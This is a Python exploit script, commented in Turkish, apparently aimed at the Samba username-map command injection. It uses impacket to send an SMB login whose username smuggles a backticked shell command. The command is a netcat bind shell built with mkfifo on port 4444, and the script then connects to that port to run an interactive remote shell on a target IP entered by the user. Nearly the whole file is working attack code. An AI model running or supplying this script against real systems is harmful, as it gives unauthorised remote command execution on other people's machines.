import random
import string
import socket
from impacket.smbconnection import SMBConnection
import select

def random_text(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def generate_payload(bind_port, shell_path="/bin/sh"):
    # Bind shell 
    backpipe = ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 8)))
    payload = (
        f"mkfifo /tmp/{backpipe}; "
        f"cat /tmp/{backpipe} | {shell_path} -i 2>&1 | "
        f"nc -lvp {bind_port} >/tmp/{backpipe} & "
        f"rm /tmp/{backpipe}"
    )
    return payload

def exploit(target_ip, payload, smb_port=139):
    print("[+] Connecting to target...")

    try:
        smb = SMBConnection(target_ip, target_ip, sess_port=smb_port)
        smb.login('', '')  # Anonim giriş

        username = f"/=`nohup {payload} `"
        print(f"[+] Sending payload: {username}")

        # Exploit ile hedefe payload'u gönderiyoruz
        smb.login(username, random_text(16))
        print("[+] Payload sent successfully. Connecting to the shell...")

        smb.logoff()
    except Exception as e:
        print(f"")


def interact_with_shell(target_ip, bind_port):
    try:
        print(f"[+] Connecting to {target_ip}:{bind_port} for interactive shell...")
        sock = socket.create_connection((target_ip, bind_port))
        print("[+] Connected to the target. Type your commands below.\n")

        # Prompt'u karşılamak için başlangıçta bir küçük okuma yap
        initial_response = sock.recv(4096).decode(errors="ignore")
        print(initial_response, end="")

        while True:
            # Kullanıcıdan komut al
            cmd = input("$ ")
            if cmd.lower() == "exit":
                print("[+] Exiting shell.")
                break

            # Komutun sonuna yeni satır ekleyerek gönder
            sock.sendall((cmd + "\n").encode())

            # Gelen yanıtı oku ve prompt bekle
            response = b""
            while True:
                chunk = sock.recv(4096)  # Gelen veriyi oku
                response += chunk
                if b"$ " in chunk or b"# " in chunk:  # Prompt'u bulduğunda çık
                    break

            # Yanıtı ekrana yaz
            print(response.decode(errors="ignore"), end="")

        sock.close()
    except Exception as e:
        print(f"[-] Failed to interact with the shell: {e}")





if __name__ == "__main__":
    target = input("Enter the target IP address: ")
    bind_port = 4444  # Hedefte kullanılacak portu sabitliyoruz

    # Payload oluştur
    malicious_payload = generate_payload(bind_port)

    # Exploit'i çalıştır
    exploit(target, malicious_payload)

    # Shell ile etkileşime geç
    interact_with_shell(target, bind_port)
